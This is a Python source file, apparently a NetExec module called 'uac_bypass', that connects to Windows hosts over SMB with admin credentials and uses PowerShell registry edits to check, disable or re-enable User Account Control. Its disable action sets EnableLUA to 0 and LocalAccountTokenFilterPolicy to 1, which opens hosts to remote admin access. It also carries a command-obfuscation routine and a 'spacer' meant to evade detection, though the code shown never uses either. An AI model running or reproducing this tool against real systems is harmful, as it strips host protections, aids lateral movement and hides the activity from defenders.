# No longer need explicit exec method import
# from nxc.protocols.smb.atexec import TSCH_EXEC
import random
import string

def randomize_case(s):
    """Randomizes the case of each character in a string."""
    return "".join(random.choice([c.upper(), c.lower()]) for c in s)

def obfuscate_cmd(command):
    """Obfuscates command by randomizing case, inserting carets, and using environment variable expansion."""
    # Randomly choose which characters to put carets before (avoiding existing carets)
    chars_to_escape = '^&|<>()@'
    potential_positions = [i for i, char in enumerate(command) if char in chars_to_escape and i > 0 and command[i-1] != '^']
    
    # Add carets to about 70% of escapable characters
    positions_to_caret = random.sample(potential_positions, int(len(potential_positions) * 0.7)) if potential_positions else []
    
    # Insert carets
    for pos in sorted(positions_to_caret, reverse=True):
        command = command[:pos] + '^' + command[pos:]
    
    # Replace common commands with randomized environment variables
    reg_cmd = 'reg'
    query_cmd = 'query'
    add_cmd = 'add'
    system_path = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
    
    # Split by spaces to avoid obfuscating inside quoted parts
    parts = []
    in_quote = False
    current_part = ""
    
    for char in command:
        if char == '"' and (not current_part or current_part[-1] != '^'):
            in_quote = not in_quote
            current_part += char
        elif char == ' ' and not in_quote:
            parts.append(current_part)
            current_part = ""
        else:
            current_part += char
    
    if current_part:
        parts.append(current_part)
    
    # Randomize case and apply other obfuscation to each part
    obfuscated_parts = []
    for part in parts:
        if part == reg_cmd:
            # 50% chance to use %__APPDATA:~-3,1%e%__APPDATA:~-3,1% instead of "reg"
            if random.random() > 0.5:
                obfuscated_parts.append(randomize_case(part))
            else:
                # Use environment variable substring extraction to spell 'reg'
                obfuscated_parts.append("%__APPDATA:~-3,1%e%__APPDATA:~-3,1%")
        elif part == query_cmd or part == add_cmd:
            obfuscated_parts.append(randomize_case(part))
        elif system_path in part:
            # Keep paths as they are to not break functionality
            obfuscated_parts.append(part)
        elif '/v' in part or '/t' in part or '/d' in part or '/f' in part:
            # Randomize flags
            obfuscated_parts.append(randomize_case(part))
        else:
            obfuscated_parts.append(part)
    
    # Join parts back together
    obfuscated_cmd = ' '.join(obfuscated_parts)
    
    # Add random set commands at the start 20% of the time
    if random.random() < 0.2:
        random_var = ''.join(random.choice(string.ascii_uppercase) for _ in range(5))
        random_value = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
        obfuscated_cmd = f"{randomize_case('set')} {random_var}={random_value} & {obfuscated_cmd}"
    
    return obfuscated_cmd

class NXCModule:
    """
    Module by @clandestine
    Uses connection.ps_execute() to attempt modification of UAC settings
    """
    name = "uac_bypass"
    description = "Check or modify UAC settings using PowerShell execution"
    supported_protocols = ["smb"]
    opsec_safe = True # PowerShell execution is generally safer than custom bypasses
    multiple_hosts = True

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.action = None

    def options(self, context, module_options):
        """
        ACTION:     "check" to view UAC settings, "disable" to disable UAC, or "enable" to enable UAC (required)
        """
        if "ACTION" not in module_options:
            context.log.fail("ACTION option not specified!")
            return

        if module_options["ACTION"].lower() not in ["check", "enable", "disable"]:
            context.log.fail("ACTION must be check, enable, or disable")
            return
        self.action = module_options["ACTION"].lower()

    def on_admin_login(self, context, connection):
        # Use ps_execute directly from the connection object
        context.log.debug("Attempting UAC operations via connection.ps_execute()")
        
        # Random string to use as a spacer to further confuse detection
        spacer = f"::  ::: {''.join(random.choice('.*+') for _ in range(random.randint(5, 15)))} :::"
        
        # Commands to check or modify UAC settings
        if self.action == "check":
            context.log.debug("Preparing registry query commands for UAC check")
            # Define our registry paths with some randomization
            system_path = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
            value_1 = 'EnableLUA'
            value_2 = 'ConsentPromptBehaviorAdmin'
            value_3 = 'ConsentPromptBehaviorUser' # Retained for completeness, though not typically parsed here
            value_4 = 'LocalAccountTokenFilterPolicy'
            
            # PowerShell commands using Get-ItemProperty
            commands = [
                f'(Get-ItemProperty -Path "{system_path}").{value_1}',
                f'(Get-ItemProperty -Path "{system_path}").{value_2}',
                # f'(Get-ItemProperty -Path "{system_path}").{value_3}', # Not typically displayed
                f'(Get-ItemProperty -Path "{system_path}").{value_4} -ErrorAction SilentlyContinue' # Check this one silently
            ]
            
            full_ps_command = "; ".join(commands)
            context.log.debug(f"Executing PS command: {full_ps_command}")
            
            # Execute using ps_execute
            output_list = connection.ps_execute(full_ps_command, get_output=True)
            output = "\n".join(output_list) # ps_execute returns a list
            
            if isinstance(output, bytes):
                try:
                    output = output.decode(connection.args.codec, errors='replace')
                except Exception as e:
                    context.log.debug(f"Error decoding output: {e}. Falling back to latin-1")
                    output = output.decode('latin-1', errors='replace')

            if output:
                context.log.success("UAC settings retrieved successfully:")
                
                results = output.strip().split('\n')
                try:
                    # Parse results based on command order
                    lua_value = results[0].strip()
                    admin_consent_value = results[1].strip()
                    # LocalAccountTokenFilterPolicy might not exist, handle potential IndexError or empty string
                    remote_uac_value = results[2].strip() if len(results) > 2 and results[2].strip() else "Not Set"

                    status = "Enabled" if lua_value == "1" else "Disabled"
                    context.log.highlight(f"UAC Status: {status} (EnableLUA = {lua_value})")

                    behavior = "Unknown"
                    if admin_consent_value == "0":
                        behavior = "Elevate without prompting"
                    elif admin_consent_value == "1":
                        behavior = "Prompt for credentials on the secure desktop"
                    elif admin_consent_value == "2":
                        behavior = "Prompt for consent on the secure desktop"
                    elif admin_consent_value == "3":
                        behavior = "Prompt for credentials"
                    elif admin_consent_value == "4":
                        behavior = "Prompt for consent"
                    elif admin_consent_value == "5":
                        behavior = "Prompt for consent for non-Windows binaries"
                    context.log.highlight(f"Admin Prompt Behavior: {behavior} (ConsentPromptBehaviorAdmin = {admin_consent_value})")

                    remote_status = "Enabled (Remote UAC Restrictions Disabled)" if remote_uac_value == "1" else "Disabled (Remote UAC Restrictions Enabled)"
                    if remote_uac_value == "Not Set":
                        remote_status = "Not Set (Defaults to Enabled)"
                    context.log.highlight(f"Remote UAC Filtering: {remote_status} (LocalAccountTokenFilterPolicy = {remote_uac_value})")

                except (IndexError, ValueError) as e:
                    context.log.fail(f"Failed to parse UAC settings from output: {e}\nOutput received:\n{output}")
            else:
                context.log.fail("Failed to retrieve UAC settings or no output received.")
                
        elif self.action == "disable":
            context.log.debug("Preparing PowerShell commands to disable UAC")
            # PS commands to disable UAC and enable remote access
            system_path = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' # PowerShell path
            command1 = f'Set-ItemProperty -Path "{system_path}" -Name EnableLUA -Value 0 -Force'
            command2 = f'Set-ItemProperty -Path "{system_path}" -Name LocalAccountTokenFilterPolicy -Value 1 -Force -ErrorAction SilentlyContinue' # Ensure this key exists or create it
            # Create the key if it doesn't exist
            command_check_create = f'if (-not (Test-Path -Path "{system_path}")) {{ New-Item -Path "{system_path}" -Force }}; if (-not (Get-ItemProperty -Path "{system_path}" -Name LocalAccountTokenFilterPolicy -ErrorAction SilentlyContinue)) {{ New-ItemProperty -Path "{system_path}" -Name LocalAccountTokenFilterPolicy -Value 0 -PropertyType DWORD -Force }}'
            
            full_command = f"{command_check_create}; {command1}; {command2}"
            context.log.debug(f"Executing PS command: {full_command}")
            
            # Execute with ps_execute
            output_list = connection.ps_execute(full_command, get_output=True)
            output = "\n".join(output_list)
            if isinstance(output, bytes):
                output = output.decode(connection.args.codec, errors='replace')
            
            # Check success (less reliable with PS, look for lack of errors)
            if "Exception" not in output and "Error" not in output:
                context.log.success("UAC disable commands sent successfully! A system restart is required for changes to take effect.")
            else:
                context.log.fail(f"Failed to disable UAC. Output: {output}")
                
        elif self.action == "enable":
            context.log.debug("Preparing PowerShell commands to enable UAC")
            # PS commands to enable UAC with default settings
            system_path = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' # PowerShell path
            command1 = f'Set-ItemProperty -Path "{system_path}" -Name EnableLUA -Value 1 -Force'
            command2 = f'Set-ItemProperty -Path "{system_path}" -Name ConsentPromptBehaviorAdmin -Value 5 -Force'
            command3 = f'Set-ItemProperty -Path "{system_path}" -Name LocalAccountTokenFilterPolicy -Value 0 -Force'
            
            full_command = f"{command1}; {command2}; {command3}"
            context.log.debug(f"Executing PS command: {full_command}")
            
            # Execute with ps_execute
            output_list = connection.ps_execute(full_command, get_output=True)
            output = "\n".join(output_list)
            if isinstance(output, bytes):
                output = output.decode(connection.args.codec, errors='replace')
            
            # Check success
            if "Exception" not in output and "Error" not in output:
                context.log.success("UAC enable commands sent successfully! A system restart is required for changes to take effect.")
            else:
                context.log.fail(f"Failed to enable UAC. Output: {output}") 